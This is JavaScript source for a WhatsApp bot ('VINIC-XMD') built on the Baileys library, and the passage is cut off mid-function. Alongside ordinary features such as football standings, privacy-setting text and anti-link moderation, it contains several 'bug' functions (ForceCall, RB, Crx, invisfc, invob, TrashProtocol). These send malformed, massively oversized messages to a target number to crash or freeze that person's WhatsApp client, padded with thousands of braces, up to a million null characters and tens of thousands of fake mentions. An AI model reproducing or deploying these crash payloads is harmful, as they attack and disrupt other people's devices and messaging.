require('../setting/config')
const yts = require('yt-search')
const fs = require('fs')
const axios = require('axios')
const googleTTS = require('google-tts-api')
const devKelvin = '256742932677';
const checkDiskSpace = require('check-disk-space').default;
const chalk = require("chalk")
const fetch = require("node-fetch")
const FormData = require('form-data')
const jimp = require("jimp")
const { fromBuffer } =  require('file-type')
const cheerio = require('cheerio')
const os = require('os')
const fg = require('api-dylux')
const PDFDocument = require('pdfkit')
const {translate} = require('@vitalets/google-translate-api')
const path = require('path')
const { getDevice } = require('@whiskeysockets/baileys')
const fsp = fs.promises;
const lolcatjs = require('lolcatjs')
const speed = require('performance-now')
const { performance } = require("perf_hooks")
const util = require("util")
const timezones = global.timezones || "Africa/Kampala"; // Default to Uganda timezone
const acrcloud = require ('acrcloud')
const moment = require("moment-timezone")
const { ytsearch, ytmp3, ytmp4 } = require('@dark-yasiya/yt-dl.js'); 
const { spawn, exec, execSync } = require('child_process')
const { default: baileys, proto, jidNormalizedUser, generateWAMessage, generateWAMessageFromContent, getContentType, downloadContentFromMessage,prepareWAMessageMedia } = require("@whiskeysockets/baileys")
module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
try {
const body = (m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "")
const budy = (typeof m.text === 'string' ? m.text : '')
var textmessage = (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || budy) : ""
const content = JSON.stringify(mek.message)
const type = Object.keys(mek.message)[0]
if (m && type == "protocolMessage") conn.ev.emit("message.delete", m.message.protocolMessage.key)
const { sender } = m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us")
// database 
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'))
const botNumber = await conn.decodeJid(conn.user.id)
const Access = [botNumber, devKelvin, ...global.owner, ...global.sudo]
.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net") .includes(m.sender) ? true : m. isChecking ? true : false;

//prefix   
const prefix = global.prefixz; 

const isCmd = body.startsWith(prefix);
const trimmedBody = isCmd ? body.slice(prefix.length).trimStart() : "";
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name";
const text = q = args.join(" ")
const fatkuns = m.quoted || m;
const quoted = fatkuns.mtype === 'buttonsMessage' ? fatkuns[Object.keys(fatkuns)[1]] : fatkuns.mtype === 'templateMessage' ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : fatkuns.mtype === 'product' ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m;
const qmsg = quoted.msg || quoted;
const mime = qmsg.mimetype || '';
const isImage = type === 'imageMessage';
const isVideo = type === 'videoMessage';
const isAudio = type === 'audioMessage';
const isMedia = /image|video|sticker|audio/.test(mime)
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
//group
const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? participants.filter(v => v.admin !== null).map(v => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const peler = fs.readFileSync('./start/lib/media/reboot.jpg')
const cina = fs.readFileSync('./start/lib/media/x.jpg')
function getRandomImage() {
const randomIndex = Math.floor(Math.random() * cina.length)
return cina[randomIndex]
}
const cinahitam = getRandomImage()
async function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
const Usage = prefix + command
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
//function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, CheckBandwidth, getBuffer, getSizeMedia, runtime, fetchJson, sleep, getRandom } = require('./lib/myfunction')
const { obfuscateJS } = require("./lib/encapsulation");  // Fixed line 102
const { handleMediaUpload } = require('./lib/catbox');
const {styletext, remind, Wikimedia, wallpaper} = require('./lib/scraper')
const {
 fetchMp3DownloadUrl,
  fetchVideoDownloadUrl,
  saveStatusMessage,
  acr,
  obfus,
  saveDatabase,
  ephoto,
  loadBlacklist,
  handleChatbot,
  initializeDatabase,
  delay,
  recordError,
  shouldLogError } = require('../vinic')  // use functions in vinicjs
const {fetchReactionImage} = require('./lib/reaction')
const { toAudio } = require('./lib/converter');
const { jadibot, stopjadibot, listjadibot } = require('./jadibot')
const reaction = async (jidss, emoji) => {
conn.sendMessage(jidss, { react: { text: emoji, key: m.key } })
}

//====FUNCTION FOR SPORT MENU
async function formatStandings(leagueCode, leagueName, { m, reply }) {
  try {
    const apiUrl = `${global.api}/football?code=${leagueCode}&query=standings`;
    const response = await fetch(apiUrl);
    const data = await response.json();

    if (!data.result || !data.result.standings) {
      return reply(`❌ Failed to fetch ${leagueName} standings. Please try again later.`);
    }

    const standings = data.result.standings;
    let message = `*⚽ ${leagueName} Standings ⚽*\n\n`;
    
    standings.forEach((team) => {
      let positionIndicator = '';
      if (leagueCode === 'CL' || leagueCode === 'EL') {
        if (team.position <= (leagueCode === 'CL' ? 4 : 3)) positionIndicator = '🌟 ';
      } else {
        if (team.position <= 4) positionIndicator = '🌟 '; 
        else if (team.position === 5 || team.position === 6) positionIndicator = '⭐ ';
        else if (team.position >= standings.length - 2) positionIndicator = '⚠️ '; 
      }

      message += `*${positionIndicator}${team.position}.* ${team.team}\n`;
      message += `   📊 Played: ${team.played} | W: ${team.won} | D: ${team.draw} | L: ${team.lost}\n`;
      message += `   ⚽ Goals: ${team.goalsFor}-${team.goalsAgainst} (GD: ${team.goalDifference > 0 ? '+' : ''}${team.goalDifference})\n`;
      message += `   � Points: *${team.points}*\n\n`;
    });

    if (leagueCode === 'CL' || leagueCode === 'EL') {
      message += '\n*🌟 = Qualification for next stage*';
    } else {
      message += '\n*🌟 = UCL | ⭐ = Europa | ⚠️ = Relegation*';
    }
    
    reply(message);
  } catch (error) {
    console.error(`Error fetching ${leagueName} standings:`, error);
    reply(`❌ Error fetching ${leagueName} standings. Please try again later.`);
  }
}

async function formatMatches(leagueCode, leagueName, { m, reply }) {
  try {
    const apiUrl = `${global.api}/football?code=${leagueCode}&query=matches`;
    const response = await fetch(apiUrl);
    const data = await response.json();

    if (!data.result?.matches?.length) {
      return reply(`❌ No ${leagueName} matches found or failed to fetch data.`);
    }

    const { liveMatches, finishedMatches, otherMatches } = categorizeMatches(data.result.matches);

    const messageSections = [
      buildLiveMatchesSection(liveMatches),
      buildFinishedMatchesSection(finishedMatches),
      buildOtherMatchesSection(otherMatches, liveMatches, finishedMatches)
    ].filter(Boolean);

    const header = `*⚽ ${leagueName} Match Results & Live Games ⚽*\n\n`;
    const finalMessage = messageSections.length 
      ? header + messageSections.join('\n')
      : header + `No current or recent matches found. Check upcoming matches using .${leagueCode.toLowerCase()}upcoming`;

    reply(finalMessage);
  } catch (error) {
    console.error(`Error fetching ${leagueName} matches:`, error);
    reply(`❌ Error fetching ${leagueName} matches. Please try again later.`);
  }
}

function categorizeMatches(matches) {
  const categories = {
    liveMatches: [],
    finishedMatches: [],
    otherMatches: []
  };

  matches.forEach(match => {
    if (match.status === 'FINISHED') {
      categories.finishedMatches.push(match);
    } 
    else if (isLiveMatch(match)) {
      categories.liveMatches.push(match);
    } 
    else {
      categories.otherMatches.push(match);
    }
  });

  return categories;
}

function isLiveMatch(match) {
  const liveStatusIndicators = ['LIVE', 'ONGOING', 'IN_PROGRESS', 'PLAYING'];
  return (
    (match.status && liveStatusIndicators.some(indicator => 
      match.status.toUpperCase().includes(indicator))) ||
    (match.score && match.status !== 'FINISHED')
  );
}

function buildLiveMatchesSection(liveMatches) {
  if (!liveMatches.length) return null;
  
  let section = `🔥 *Live Matches (${liveMatches.length})*\n\n`;
  liveMatches.forEach((match, index) => {
    section += `${index + 1}. 🟢 ${match.status || 'LIVE'}\n`;
    section += `   ${match.homeTeam} vs ${match.awayTeam}\n`;
    if (match.score) section += `   📊 Score: ${match.score}\n`;
    if (match.time) section += `   ⏱️ Minute: ${match.time || 'Unknown'}\n`;
    section += '\n';
  });
  
  return section;
}

function buildFinishedMatchesSection(finishedMatches) {
  if (!finishedMatches.length) return null;

  let section = `✅ *Recent Results (${finishedMatches.length})*\n\n`;
  const byMatchday = finishedMatches.reduce((acc, match) => {
    (acc[match.matchday] = acc[match.matchday] || []).push(match);
    return acc;
  }, {});

  Object.keys(byMatchday)
    .sort((a, b) => b - a)
    .forEach(matchday => {
      section += `📅 *Matchday ${matchday} (${byMatchday[matchday].length} matches)*:\n`;
      byMatchday[matchday].forEach((match, index) => {
        const winnerEmoji = match.winner === 'Draw' ? '⚖️' : '🏆';
        section += `${index + 1}. ${match.homeTeam} ${match.score} ${match.awayTeam}\n`;
        section += `   ${winnerEmoji} ${match.winner}\n\n`;
      });
    });

  return section;
}

function buildOtherMatchesSection(otherMatches, liveMatches, finishedMatches) {
  if (!otherMatches.length || liveMatches.length || finishedMatches.length) return null;
  
  let section = `📌 *Other Matches (${otherMatches.length})*\n\n`;
  otherMatches.forEach((match, index) => {
    section += `${index + 1}. ${match.homeTeam} vs ${match.awayTeam}\n`;
    section += `   Status: ${match.status || 'Unknown'}\n\n`;
  });
  
  return section;
}

async function formatTopScorers(leagueCode, leagueName, { m, reply }) {
  try {
    const apiUrl = `${global.api}/football?code=${leagueCode}&query=scorers`;
    const response = await fetch(apiUrl);
    const data = await response.json();

    if (!data.result || !data.result.topScorers) {
      return reply(`❌ No ${leagueName} top scorers data found.`);
    }

    const scorers = data.result.topScorers;
    let message = `*⚽ ${leagueName} Top Scorers ⚽*\n\n`;
    message += '🏆 *Golden Boot Race*\n\n';

    scorers.forEach(player => {
      message += `*${player.rank}.* ${player.player} (${player.team})\n`;
      message += `   ⚽ Goals: *${player.goals}*`;
      message += ` | 🎯 Assists: ${player.assists}`;
      message += ` | ⏏️ Penalties: ${player.penalties}\n\n`;
    });

    reply(message);
  } catch (error) {
    console.error(`Error fetching ${leagueName} top scorers:`, error);
    reply(`❌ Error fetching ${leagueName} top scorers. Please try again later.`);
  }
}

async function formatUpcomingMatches(leagueCode, leagueName, { m, reply }) {
  try {
    const apiUrl = `${global.api}/football?code=${leagueCode}&query=upcoming`;
    const response = await fetch(apiUrl);
    const data = await response.json();

    if (!data.result || !data.result.upcomingMatches || data.result.upcomingMatches.length === 0) {
      return reply(`❌ No upcoming ${leagueName} matches found.`);
    }

    const matches = data.result.upcomingMatches;
    let message = `*📅 Upcoming ${leagueName} Matches ⚽*\n\n`;

    const matchesByMatchday = {};
    matches.forEach(match => {
      if (!matchesByMatchday[match.matchday]) {
        matchesByMatchday[match.matchday] = [];
      }
      matchesByMatchday[match.matchday].push(match);
    });

    const sortedMatchdays = Object.keys(matchesByMatchday).sort((a, b) => a - b);

    sortedMatchdays.forEach(matchday => {
      message += `*🗓️ Matchday ${matchday}:*\n`;
      
      matchesByMatchday[matchday].forEach(match => {
        const matchDate = new Date(match.date);
        const formattedDate = matchDate.toLocaleString('en-US', {
          weekday: 'short',
          month: 'short',
          day: 'numeric',
          hour: '2-digit',
          minute: '2-digit'
        });
        
        message += `\n⏰ ${formattedDate}\n`;
        message += `   🏠 ${match.homeTeam} vs ${match.awayTeam} 🚌\n\n`;
      });
      
      message += '\n';
    });

    reply(message);
  } catch (error) {
    console.error(`Error fetching upcoming ${leagueName} matches:`, error);
    reply(`❌ Error fetching upcoming ${leagueName} matches. Please try again later.`);
  }
}

// ========== PRIVACY SETTING DESCRIPTIONS ==========
function getLastSeenDescription(option) {
    const descriptions = {
        "all": "• 👀 Everyone can see your last seen time",
        "contacts": "• 🤝 Only your contacts can see your last seen time",
        "contact_blacklist": "• ✅ Everyone except blocked contacts can see your last seen time", 
        "none": "• 🙈 No one can see your last seen time (completely hidden)"
    };
    return descriptions[option] || "Privacy setting updated";
}

function getGroupAddDescription(option) {
    const descriptions = {
        "all": "• 👥 Anyone can add you to groups",
        "contacts": "• 🤝 Only your contacts can add you to groups",
        "contact_blacklist": "• ✅ Everyone except blocked contacts can add you to groups"
    };
    return descriptions[option] || "Group add setting updated";
}

function getOnlineDescription(option) {
    const descriptions = {
        "all": "• 💚 Everyone can see when you're online",
        "match_last_seen": "• 🔄 Your online status follows your last seen privacy settings"
    };
    return descriptions[option] || "Online status setting updated";
}

function getProfilePictureDescription(option) {
    const descriptions = {
        "all": "• 👀 Everyone can see your profile picture",
        "contacts": "• 🤝 Only your contacts can see your profile picture",
        "contact_blacklist": "• ✅ Everyone except blocked contacts can see your profile picture",
        "none": "• 🙈 No one can see your profile picture (completely hidden)"
    };
    return descriptions[option] || "Profile picture setting updated";
}
// ========== END PRIVACY SETTING DESCRIPTIONS ==========


   // Memory formatting function
    const formatMemory = (memory) => {
        return memory < 1024 * 1024 * 1024
            ? Math.round(memory / 1024 / 1024) + ' MB'
            : Math.round(memory / 1024 / 1024 / 1024) + ' GB';
    };

    // Memory progress bar (System RAM usage)
    const progressBar = (used, total, size = 10) => {
        let percentage = Math.round((used / total) * size);
        let bar = '█'.repeat(percentage) + '░'.repeat(size - percentage);
        return `[${bar}] ${Math.round((used / total) * 100)}%`;
};
// function that converts to audio and video====
async function webp2mp4(source) {
  let form = new FormData();
  let isUrl = typeof source === 'string' && /https?:\/\//.test(source);
  
  form.append('new-image-url', isUrl ? source : '');
  form.append('new-image', isUrl ? '' : source, 'image.webp');
  
  let res = await fetch('https://ezgif.com/webp-to-mp4', {
    method: 'POST',
    body: form
  });
  
  let html = await res.text();
  let $ = cheerio.load(html);
  let form2 = new FormData();
  let obj = {};
  
  $('form input[name]').each((_, el) => {
    obj[$(el).attr('name')] = $(el).val();
    form2.append($(el).attr('name'), $(el).val());
  });
  
  let res2 = await fetch('https://ezgif.com/webp-to-mp4/' + obj.file, {
    method: 'POST',
    body: form2
  });
  
  let html2 = await res2.text();
  let $2 = cheerio.load(html2);
  return new URL($2('div#output > p.outfile > video > source').attr('src'), res2.url).toString();
}


  // Function to check bandwidth (download/upload)
  async function checkBandwidth() {
    // This is a simplified implementation
    // For more accurate results, you might want to use a dedicated library
    return {
      download: 'N/A', // You can implement actual measurement here
      upload: 'N/A'    // You can implement actual measurement here
    };
  }

// ========== ANTI-LINK HELPER FUNCTIONS ==========
// Anti-link helper functions
function detectUrls(messageContent) {
    if (!messageContent) return [];
    
    const text = messageContent.conversation || 
                (messageContent.extendedTextMessage && messageContent.extendedTextMessage.text) || 
                (messageContent.imageMessage && messageContent.imageMessage.caption) || 
                (messageContent.videoMessage && messageContent.videoMessage.caption) || '';
    
    // Detect URLs with common domains
    const urlRegex = /(https?:\/\/)?(www\.)?([a-zA-Z0-9-]+\.)?(whatsapp\.com|chat\.whatsapp\.com|facebook\.com|fb\.com|instagram\.com|twitter\.com|x\.com|t\.me|telegram\.me|telegram\.org|youtube\.com|youtu\.be|tiktok\.com|discord\.gg|discord\.com|snapchat\.com|reddit\.com|linkedin\.com)/gi;
    const matches = text.match(urlRegex);
    return matches ? matches : [];
}

async function handleLinkViolation(message, urls) {
    try {
        const sender = message.key.participant || message.key.remoteJid;
        const groupMetadata = await conn.groupMetadata(message.key.remoteJid).catch(() => null);
        
        if (!groupMetadata) return;
        
        const isAdmin = groupMetadata.participants.find(p => p.id === sender)?.admin;

        // Allow admins to post links
        if (isAdmin) return;

        // Delete the message for everyone
        await conn.sendMessage(message.key.remoteJid, {
            delete: {
                remoteJid: message.key.remoteJid,
                fromMe: false,
                id: message.key.id,
                participant: sender
            }
        }).catch(() => {});

        // Warn the user and notify group
        await conn.sendMessage(message.key.remoteJid, {
            text: `⚠️ @${sender.split('@')[0]}, links are not allowed in this group!\nYour message containing a link has been deleted.`,
            mentions: [sender]
        }, { quoted: null });

        // Log the violation
        console.log(`Deleted link from ${sender} in ${message.key.remoteJid}`);
        
    } catch (error) {
        console.error('Error handling link violation:', error);
    }
}
// ========== END ANTI-LINK HELPER FUNCTIONS ==========
//================== [ CONSOLE LOG] ==================//
const dayz = moment(Date.now()).tz(`${timezones}`).locale('en').format('dddd');
const timez = moment(Date.now()).tz(`${timezones}`).locale('en').format('HH:mm:ss z');
const datez = moment(Date.now()).tz(`${timezones}`).format("DD/MM/YYYY");

if (m.message) {
  lolcatjs.fromString(chalk.cyan.bold(`┏━━━━━━━━━━━━━『 🌟 VINIC-XMD 🌟 』━━━━━━━━━━━━━─`));
  lolcatjs.fromString(chalk.yellow(`» 📅 Sent Time: ${dayz}, ${timez}`));
  lolcatjs.fromString(chalk.green(`» 📩 Message Type: ${m.mtype}`));
  lolcatjs.fromString(chalk.magenta(`» 👤 Sender Name: ${pushname || 'N/A'}`));
  lolcatjs.fromString(chalk.blue(`» 💬 Chat ID: ${m.chat.split('@')[0]}`));
  lolcatjs.fromString(chalk.white(`» ✉️ Message: ${budy || 'N/A'}`));
  lolcatjs.fromString(chalk.cyan.bold('┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━─ ⳹\n\n'));
}
//<================================================>//
if (autoread) {
            conn.readMessages([m.key])
        }
        
        if (global.autoTyping) {
        conn.sendPresenceUpdate('composing', from)
        }

        if (global.autoRecording) {
        conn.sendPresenceUpdate('recording', from)
        }
        conn.sendPresenceUpdate('uavailable', from)
                if (autobio) {
            conn.updateProfileStatus(`24/7 𝗩𝗶𝗻𝗶𝗰-𝗫𝗺𝗱 𝗼𝗻𝗹𝗶𝗻𝗲 𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ༒𝗞𝗲𝘃𝗶𝗻 𝘁𝗲𝗰𝗵༒`).catch(_ => _)
        }
let resize = async (image, width, height) => {
let oyy = await jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
return kiyomasa
}
const reply = (teks) => {
    const safeText = teks || ''; // this safety check
    conn.sendMessage(m.chat, {
    text: safeText, // Use safeText instead of teks
    contextInfo: {
    mentionedJid: [sender],
    externalAdReply: {
    title: "",
    body: `${pushname}`,
    thumbnail: peler,
    sourceUrl: 'https://www.Vinic.site',
    renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }
const buggy = `༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒\n\n𝖣𝖾𝗅𝗂𝗏𝖾𝗋𝗂𝗇𝗀 𝗍𝗈 ${q}\n 𝖲𝖾𝗇𝖽𝖾𝗋: ${pushname} \n𝖢𝗈𝗆𝗆𝖺𝗇𝖽:${command}`
async function thumb(){
conn.sendMessage(m.chat, {  
            image: { url: "https://files.catbox.moe/07de9r.jpg" },  
            caption:buggy,   
            contextInfo: {
                mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
                    newsletterJid: `120363322464215140@newsletter` 
                },
                
            }
        },{ quoted: st })
        }
async function bugLoad () {
var Lbugs = [
"𝕾𝖊",
"𝖓𝖉",
"𝖎𝖓𝖌",
"𝖇𝖚",
"𝖌𝖘",
"𝕾𝖊𝖓𝖉𝖎𝖓𝖌 𝖇𝖚𝖌𝖘.."
]
let { key } = await conn.sendMessage(from, {text: '𝐋𝐨𝐚𝐝𝐢𝐧𝐠'})

for (let i = 0; i < Lbugs.length; i++) {
await  conn.sendMessage(from, {text: Lbugs[i], edit: key });
}
}
async function doneLoad () {
var Sbugs = [
"𝕾𝖚𝖈𝖈",
"𝖊𝖘𝖘",
"𝖘𝖊𝖓𝖉",
"𝖉𝖎𝖓𝖌",
"𝖇𝖚𝖌𝖘",
"𝕾𝖚𝖈𝖈𝖊𝖘𝖘 𝖘𝖊𝖓𝖉𝖎𝖓𝖌 𝖇𝖚𝖌𝖘..."
]
let { key } = await conn.sendMessage(from, {text: '𝐋𝐨𝐚𝐝𝐢𝐧𝐠'})

for (let i = 0; i < Sbugs.length; i++) {
await  conn.sendMessage(from, {text: Sbugs[i], edit: key });
}
}
const st = {
  key: {
    fromMe: false,
    participant: "13135550002@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      
      itemCount: "4444",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["1203633695141052429@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const Kevin = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? { remoteJid: "status@broadcast" } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `Kevin`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': { url: 'https://files.catbox.moe/yqbio5.jpg' }
                }
            }
        }
async function ForceCall(target) {
let InJectXploit = JSON.stringify({
status: true,
criador: "TheXtordcv",
resultado: {
type: "md",
ws: {
_events: {
"CB:ib,,dirty": ["Array"]
},
_eventsCount: 800000,
_maxListeners: 0,
url: "wss://web.whatsapp.com/ws/chat",
config: {
version: ["Array"],
browser: ["Array"],
waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
sockCectTimeoutMs: 20000,
keepAliveIntervalMs: 30000,
logger: {},
printQRInTerminal: false,
emitOwnEvents: true,
defaultQueryTimeoutMs: 60000,
customUploadHosts: [],
retryRequestDelayMs: 250,
maxMsgRetryCount: 5,
fireInitQueries: true,
auth: {
Object: "authData"
},
markOnlineOnsockCect: true,
syncFullHistory: true,
linkPreviewImageThumbnailWidth: 192,
transactionOpts: {
Object: "transactionOptsData"
},
generateHighQualityLinkPreview: false,
options: {},
appStateMacVerification: {
Object: "appStateMacData"
},
mobile: true
}
}
}
});
let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "⩟⬦𪲁 𝐑‌‌𝐈𝐙‌𝐗𝐕‌𝐄𝐋𝐙‌‌‌‌‌𝐗‌‌𝐒 - 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: InJectXploit,
},
{
name: "call_permission_request",
buttonParamsJson: InJectXploit + "{",
},
],
},
},
},
},
}, {}
);

await conn.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});
}

async function RB(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝕶𝖓𝖔𝖝𝖋𝖆𝖒𝖎𝖑𝖞",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "\u200F",
                address: "\u200D",
              },
            },
            body: {
              text: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
            },
            nativeFlowMessage: {
              messageParamsJson: "\n".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
  console.log(chalk.yellow.bold("Sent Bugs"))
}
async function Crx(target) {
    await conn.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@𝗱𝗲𝘃𝗼𝗿𝘀𝗶𝘅 • #𝘀𝗵𝗼𝘄𝗼𝗳𝗯𝘂𝗴 🩸",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1000000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
async function invisfc(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
                    footerText: "",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await conn.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await conn.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function invob(target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 99999999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target,
                        },
                    },
                    body: {
                        text: "༒𝗞𝗲𝘃𝗶𝗻 𝘁𝗲𝗰𝗵༒" + "꧀".repeat(100000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await conn.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
    console.log(chalk.yellow('SENT BUGS🦠'));
}
async function TrashProtocol(target, mention) {
                const sex = Array.from({ length: 9741 }, (_, r) => ({
                       title: "꧀".repeat(9741),
                           rows: [`{ title: ${r + 1}, id: ${r + 1} }`]
                             }));
                             
                             const MSG = {
                             viewOnceMessage: {
                             message: {
                             listResponseMessage: {
                             title: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒",
                             listType: 2,
                             buttonText: null,
                             sections: sex,
                             singleSelectReply: { selectedRowId: "🇷🇺" },
                             contextInfo: {
                             mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                             participant: target,
                             remoteJid: "status@broadcast",
                             forwardingScore: 9741,
                             isForwarded: true,
                             forwardedNewsletterMessageInfo: {
                             newsletterJid: "9741@newsletter",
                             serverMessageId: 1,
                             newsletterName: "-"
                             }
                             },
                             description: "🇷🇺"
                             }
                             }
                             },
                             contextInfo: {
                             channelMessage: true,
                             statusAttributionType: 2
                             }
                             };

                             const msg = generateWAMessageFromContent(target, MSG, {});

                             await conn.relayMessage("status@broadcast", msg.message, {
                             messageId: msg.key.id,
                             statusJidList: [target],
                             additionalNodes: [
                             {
                             tag: "meta",
                             attrs: {},
                             content: [
                             {
                             tag: "mentioned_users",
                             attrs: {},
                             content: [
                             {
                             tag: "to",
                             attrs: { jid: target },
                             content: undefined
                             }
                             ]
                             }
                             ]
                             }
                             ]
                             });

                             if (mention) {
                             await conn.relayMessage(
                             target,
                             {
                             statusMentionMessage: {
                             message: {
                             protocolMessage: {
                             key: msg.key,
                             type: 25
                             }
                             }
                             }
                             },
                             {
                additionalNodes: [
                    {
                       tag: "meta",
